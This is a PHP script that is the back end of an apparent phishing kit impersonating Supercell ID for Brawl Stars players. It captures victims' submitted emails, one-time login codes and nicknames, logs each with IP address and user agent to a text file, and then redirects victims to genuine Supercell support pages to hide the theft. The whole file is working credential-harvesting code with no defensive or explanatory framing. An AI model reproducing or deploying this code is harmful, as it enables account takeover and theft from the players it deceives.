<?php
session_start();

$form_type = $_POST['form_type'] ?? 'unknown';
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

$sanitize = function($val) {
    return trim(str_replace(["\r", "\n"], '', $val ?? 'Unknown'));
};

if ($form_type === 'email') {
    $email = $sanitize($_POST['email']);
    $data = "Username: " . $email . "\n[TYPE] EMAIL_SUBMIT\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'next' => 'otp']);
    exit();
    
} elseif ($form_type === 'otp') {
    $email = $sanitize($_POST['email']);
    $otp = $sanitize($_POST['otp_code']);
    
    $data = "Username: " . $email . "\nPass: " . $otp . "\n[TYPE] OTP_SUBMIT\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Location: https://supercell.com/en/support/brawl-stars/');
    exit();
    
} elseif ($form_type === 'signup') {
    $nick = $sanitize($_POST['nickname']);
    $email = $sanitize($_POST['email']);
    
    $data = "Username: " . $email . "\n[NICK] " . $nick . "\n[TYPE] SIGNUP\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
    file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);
    
    header('Location: https://supercell.com/en/supercell-id/');
    exit();
    
} else {
    header('Location: https://supercell.com/en/supercell-id/');
    exit();
}
?>
